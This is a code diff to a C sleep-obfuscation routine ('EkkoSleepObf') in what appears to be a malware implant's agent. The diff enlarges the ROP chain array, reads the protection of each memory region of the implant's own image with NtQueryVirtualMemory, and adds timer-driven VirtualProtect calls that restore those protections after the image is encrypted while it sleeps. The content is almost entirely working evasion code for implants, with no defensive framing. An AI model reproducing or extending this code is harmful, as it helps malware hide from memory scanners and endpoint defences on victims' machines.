@@ -17,7 +17,7 @@ BOOL EkkoSleepObf(
     PVOID    ImgBase = { 0 };
     CONTEXT  TimerCtx = { 0 };
     CONTEXT  ThdCtx = { 0 };
-    CONTEXT  Rop[13] = { 0 };
+    CONTEXT  Rop[25] = { 0 };
     DWORD    Value = { 0 };
     DWORD    Delay = { 0 };
     BOOL     Success = { 0 };
@@ -27,6 +27,7 @@ BOOL EkkoSleepObf(
     DWORD    Inc = { 0 };
     LPVOID   ImageBase = { 0 };
     SIZE_T   ImageSize = { 0 };
+    WORD     NumSections = 0;
     LPVOID   TxtBase = { 0 };
     SIZE_T   TxtSize = { 0 };
     DWORD    Protect = { 0 };
@@ -36,6 +37,11 @@ BOOL EkkoSleepObf(
 
     ImgBase = TxtBase = agent->ModuleBaseAddr;
     ImageSize = TxtSize = agent->ImageSize;
+    NumSections = agent->NumSections;
+    pProtectData ProtectArr = (pProtectData)agent->apis->pLocalAlloc(LPTR, 25 * sizeof(ProtectData));
+
+    GetVirtualProtections(ProtectArr);
+
 
     Protect = PAGE_EXECUTE_READWRITE;
 
@@ -88,7 +94,7 @@ BOOL EkkoSleepObf(
                     //TODO implement jmp bypassing. for extra obfuscation.
 
                     //start preparing ROP chains.
-                    for (int i = 0; i < 13; i++)
+                    for (int i = 0; i < 13 + NumSections + 2; i++) //create rop chains for virtual protect number of sections + 2
                     {
                         MemoryCopy(&Rop[i], &TimerCtx, sizeof(CONTEXT));
                         Rop[i].Rip = (UINT_PTR)JmpGadget; //set RIP to null for right now. More useful for when i have a JmpGadget.
@@ -103,6 +109,11 @@ BOOL EkkoSleepObf(
                     Inc++;
 
                     /*Virtual protect*/
+                    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)agent->ModuleBaseAddr;
+                    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)agent->ModuleBaseAddr + dosHeader->e_lfanew);
+                    PIMAGE_SECTION_HEADER SectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
+
+                    //do protect change for entire binary.
                     Rop[Inc].Rip = (UINT_PTR)agent->apis->pVirtualProtect;
                     Rop[Inc].Rcx = (UINT_PTR)ImgBase;
                     Rop[Inc].Rdx = (UINT_PTR)ImageSize;
@@ -134,13 +145,20 @@ BOOL EkkoSleepObf(
                     Rop[Inc].Rdx = (UINT_PTR)&Key;
                     Inc++;
 
-                    /*Virtual protect*/
-                    Rop[Inc].Rip = (UINT_PTR)agent->apis->pVirtualProtect;
-                    Rop[Inc].Rcx = (UINT_PTR)TxtBase;
-                    Rop[Inc].Rdx = (UINT_PTR)TxtSize;
-                    Rop[Inc].R8 = (UINT_PTR)Protect;
-                    Rop[Inc].R9 = (UINT_PTR)&Value;
-                    Inc++;
+                    /* set  our memory protections back to original states. */
+                    int index = 0;
+                    DWORD PrevRegionsLength = 0;
+                    while (ProtectArr[index].RegionSize > 0)
+                    {
+                        Rop[Inc].Rip = (UINT_PTR)agent->apis->pVirtualProtect;
+                        Rop[Inc].Rcx = (UINT_PTR)ImgBase + PrevRegionsLength;
+                        Rop[Inc].Rdx = (UINT_PTR)ProtectArr[index].RegionSize;
+                        Rop[Inc].R8 = (UINT_PTR)ProtectArr[index].ProtectValue;
+                        Rop[Inc].R9 = (UINT_PTR)&Value;
+                        PrevRegionsLength += ProtectArr[index].RegionSize;
+                        index++;
+                        Inc++;
+                    }
 
                     /* End Rop Chain */
                     Rop[Inc].Rip = (UINT_PTR)agent->apis->pNtSetEvent;
@@ -227,3 +245,27 @@ END:
     return Success;
 }
 
+void GetVirtualProtections(pProtectData ProtectArr) {
+    MEMORY_BASIC_INFORMATION MBI = { 0 };
+    SIZE_T OutSize = 0;
+    DWORD TotalLength = 0;
+    INT index = 0;
+    NTSTATUS Success = 0;
+
+    while (TotalLength < agent->ImageSize)
+    {
+        Success = agent->apis->pNtQueryVirtualMemory(NtCurrentProcess(), (BYTE*)agent->ModuleBaseAddr + TotalLength, MemoryBasicInformation, &MBI, sizeof(MEMORY_BASIC_INFORMATION), &OutSize);
+        if (Success == 0)
+        {
+            TotalLength += MBI.RegionSize;
+            MemoryCopy(&ProtectArr[index].RegionSize, &MBI.RegionSize, sizeof(MBI.RegionSize));
+            MemoryCopy(&ProtectArr[index].ProtectValue, &MBI.Protect, sizeof(MBI.Protect));
+            index++;
+        }
+        else
+        {
+            break;
+        }
+
+    }
+}
